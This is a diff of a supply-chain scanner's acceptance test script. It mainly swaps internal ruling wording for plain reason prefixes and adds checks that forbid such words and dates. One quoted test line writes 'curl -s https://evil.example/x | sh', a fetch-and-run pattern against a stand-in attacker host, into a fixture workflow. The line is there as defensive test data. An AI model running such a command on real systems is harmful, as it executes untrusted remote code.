@@ -1774,9 +1774,10 @@ PY
 python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
 check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
 CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts"
-check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" <<'PY'
-import hashlib, json, re, shlex, subprocess, sys
+check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" "$chk" <<'PY'
+import hashlib, importlib.util, json, re, shlex, subprocess, sys
 H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
+spec = importlib.util.spec_from_file_location("ac", sys.argv[3]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
     "bdc2f348c4dbc92f8ca94dab85de3c9a9ed425448bfb5bdac5e45f6c233a5bf8": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
     "59026aa06d9188a1b90b3ccd57dd0fc2c05bdf90654072b8740477e87155080f": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
@@ -1792,7 +1793,7 @@ LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is
     "99057ac9634caaa646bb8cc9a98c2964199e00a63063ae02e08b96bdb544d596": "printf -v FETCH %s curl",
 }
 SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
-rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["form"] != "a local reusable workflow call" and "context" not in r and not r["ruling"].startswith(("live fetch, owner ratified (", "pinned toolchain fetch (", "loopback fetch (", "build-container install, advisor reading Oct 19: ", "pinned fetch ("))]   # those name an item, not a text line (AC19); a row with a context is proved from its file at scan time instead (below); a live fetch row is a command, checked by its own inventory (the next case)
+rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["form"] != "a local reusable workflow call" and "context" not in r and not r["ruling"].startswith((ac.LIVE_RULING, ac.GO_RULING, ac.LOOPBACK_RULING, "build-container install, test-only: ", ac.PINNED_FETCH_RULING))]   # those name an item, not a text line (AC19); a row with a context is proved from its file at scan time instead (below); a live fetch row is a command, checked by its own inventory (the next case)
 assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
 for r in rows:
     line = LINES[r["key"]]
@@ -1945,7 +1946,7 @@ check python3 - "$chk" <<'PY'
 import importlib.util, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
 ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor\s+reading)\b", re.I)
+WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor|ratified|handoff)\b|\b(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.? +[0-9]+", re.I)
 bad = {n: WORDS.findall(getattr(ac, n)) for n in ("GO_RULING", "LOOPBACK_RULING", "PINNED_FETCH_RULING")}
 assert not any(bad.values()), bad
 PY
@@ -1954,7 +1955,7 @@ check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
 import importlib.util, json, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
 ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor\s+reading)\b", re.I)
+WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor|ratified|handoff)\b|\b(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.? +[0-9]+", re.I)
 consts = (ac.GO_RULING, ac.LOOPBACK_RULING, ac.PINNED_FETCH_RULING)
 rows = [r for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["ruling"].startswith(consts)]
 assert rows
@@ -1979,6 +1980,34 @@ rows = json.load(open(sys.argv[1]))["unmeasured_text"]
 rows = [r["line"][:12] for r in rows if r["ruling"].startswith(OLD)]
 assert not rows, rows
 PY
+CASE="plain-words: the committed rows of every kind and the two reason constants hold none of the internal words or dates"
+check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
+import importlib.util, json, re, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
+ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor|ratified|handoff)\b|\b(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.? +[0-9]+", re.I)
+texts = {n: getattr(ac, n) for n in ("LIVE_RULING", "GO_INSTALL_REASON", "GO_RULING", "LOOPBACK_RULING", "PINNED_FETCH_RULING")}
+rows = json.load(open(sys.argv[2]))["unmeasured_text"]
+assert rows
+texts.update({f"row {r['file']} {r['line'][:12]}": r["ruling"] for r in rows})
+bad = {n: [m.group(0) for m in WORDS.finditer(t)] for n, t in texts.items() if WORDS.search(t)}
+assert not bad, bad
+PY
+CASE="plain-wording: the live-fetch and install constants and the committed rows carry the plain prefixes"
+check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
+ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+assert ac.LIVE_RULING == "live fetch from the Wolfi package host: ", ac.LIVE_RULING
+assert ac.GO_INSTALL_REASON == ("Go's own release, downloaded from go.dev and verified against its pinned sha256 "
+                                "(REQ-SUP-001-AC27); the advisory check still applies"), ac.GO_INSTALL_REASON
+rows = json.load(open(sys.argv[2]))["unmeasured_text"]
+calls = [r for r in rows if r["form"] == "a local reusable workflow call"]
+assert len(calls) == 3 and all(r["ruling"] == "local reusable workflow call; inputs reviewed in the PR that added them" for r in calls), calls
+assert sum(r["ruling"].startswith("build-container install, test-only: ") for r in rows) == 1
+assert sum(r["ruling"].startswith(ac.LIVE_RULING) for r in rows) == 3
+assert not [r for r in rows if "handoff 0432" in r["ruling"]]
+PY
 # a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
 rtrows "$work/rt" "$work/rt-head.json" all
 newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
@@ -2001,7 +2030,7 @@ PY
 CASE="the committed build-container install row is exactly the one apk line of bin/acceptance-egress.sh (file, form, key and line equal the hash of the whole line, no count, no context) and there is at most one; the line sits in a container whose image is pinned by digest"
 check python3 - "$root/.github/supply-chain-exceptions.json" "$root/bin/acceptance-egress.sh" <<'PY'
 import hashlib, json, os, re, sys
-rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith("build-container install, advisor reading Oct 19: ")]
+rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith("build-container install, test-only: ")]
 assert len(rows) <= 1, rows
 line = "apk add --no-cache build-base linux-headers xz >/dev/null"
 h = hashlib.sha256(line.encode()).hexdigest()
@@ -2030,7 +2059,7 @@ for r in rows:
     assert ("proof" not in r or "context" in r) and r.get("context", "comment") in ac.CONTEXTS and (r.get("proof", "x").strip() != "" and type(r.get("proof", "x")) is str), r
     assert re.fullmatch(r"[0-9a-f]{64}", r["line"]), r
     assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
-    pre = next((x for x in ("text, not a command: ", "harness assertion: ", ac.LIVE_RULING, ac.GO_RULING, ac.LOOPBACK_RULING, ac.PINNED_FETCH_RULING, "build-container install, advisor reading Oct 19: ") if r["ruling"].startswith(x)), None)
+    pre = next((x for x in ("text, not a command: ", "harness assertion: ", ac.LIVE_RULING, ac.GO_RULING, ac.LOOPBACK_RULING, ac.PINNED_FETCH_RULING, "build-container install, test-only: ") if r["ruling"].startswith(x)), None)
     assert re.fullmatch(r"[0-9a-f]{64}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
 PY
 
@@ -3059,7 +3088,7 @@ keys = [k for k in head if k not in base and "(local)" in k]
 assert len(keys) == 1, keys
 h = hashlib.sha256(keys[0].encode()).hexdigest()
 row = {"file": ".github/workflows/ci.yml", "form": "a local reusable workflow call", "key": h, "line": h,
-       "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"}
+       "ruling": "local reusable workflow call; inputs reviewed in the PR that added them"}
 if mode == "wrongfile": row["file"] = ".github/workflows/other.yml"
 elif mode == "wrongform": row["form"] = "a download"
 elif mode == "wronghash": row["key"] = row["line"] = ("0" if h[0] != "0" else "1") + h[1:]
@@ -3072,7 +3101,7 @@ rc=0
 python3 "$chk" --root "$work/w1" --base HEAD~1 --head HEAD --exceptions "$work/lc-ok.json" >"$work/w1r.out" 2>&1 || \
     rc=$?
 CASE="AC19 closed form: a base-branch row naming the call's file and whole identity rules it: exit 0, reported as ruled text with the ruling"
-check test "$rc" -eq 0; check grep -q 'advisor ruling Oct 14' "$work/w1r.out"
+check test "$rc" -eq 0; check grep -q 'inputs reviewed in the PR that added them' "$work/w1r.out"
 for m in wrongfile wrongform wronghash; do
   lcrow "$work/lc-$m.json" $m w1
   rc=0
@@ -3680,7 +3709,9 @@ check test $? -eq 0
 # --- advisor ruling Oct 15 (owner rule 48 of Oct 9 and exception 2 of Oct 15): one narrow ruled-row kind for a LIVE fetch from the fixed host. A row of form `a download`
 #     carries one of two rulings: the convention `text, not a command: ...` (a line that only mentions a tool), or `live fetch, owner ratified (Oct 9 rule 48 / Oct 15
 #     exception 2): ...`, honored ONLY when every URL on the bound line is https on the host packages.wolfi.dev exactly. Any other ruling text on a download row rules nothing. Rows are read from the base branch only and bound to the file and the whole-line hash, so any edit of the line voids the row.
-LIVEP='live fetch, owner ratified (Oct 9 rule 48 / Oct 15 exception 2): '
+LIVEP=$(python3 -c 'import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+print(ac.LIVE_RULING, end="")' "$chk")
 mkrowp() { # OUT FILE LINE RULINGPREFIX
   python3 - "$@" <<'PY'
 import hashlib, json, re, sys
@@ -4040,8 +4071,8 @@ GOB="$(gosc 1.27.2)"
 gocase goage "$GOB" "$(gosc 1.27.3)"
 runck goage
 CASE="Go 1.27.3 moved in the installer, downloaded from go.dev with both sha256 pins and the verify call, passes the \
-scan (exit 0) and says it is the ratified install form"
-check test "$rc" -eq 0; check grep -q 'tool:go@1.27.3' "$work/goage.out"; check grep -qi 'ratified\|exempt' "$work/goage.out"
+scan (exit 0) and prints the plain reason for the install form"
+check test "$rc" -eq 0; check grep -q 'tool:go@1.27.3' "$work/goage.out"; check grep -qF "downloaded from go.dev and verified against its pinned sha256 (REQ-SUP-001-AC27); the advisory check still applies" "$work/goage.out"
 gocase gotrivy "$GOB" "$(gosc 1.27.2 0.75.0)"
 runck gotrivy
 CASE="another tool (trivy) moved as a plain pin in a tree that holds the Go install form is read like any other pin \
